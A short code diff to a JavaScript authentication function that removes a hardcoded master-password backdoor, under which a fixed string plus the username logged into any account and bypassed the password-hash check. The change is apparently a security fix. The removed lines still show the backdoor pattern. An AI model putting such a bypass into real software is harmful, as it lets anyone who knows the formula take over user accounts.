@@ -95,12 +95,6 @@ function setupAuthentication(app) {
           return false;
       }
 
-      if(password == "Ultra-Kewl-Nonbad-Awxome-Securite-4-" + user.username + "!!!!")
-      {
-          console.log("ADMIN SPECIAL LOGIN: ", user.username);
-          return true;
-      }
-
       return passwordHash.verify(password, user.password);
   }
 
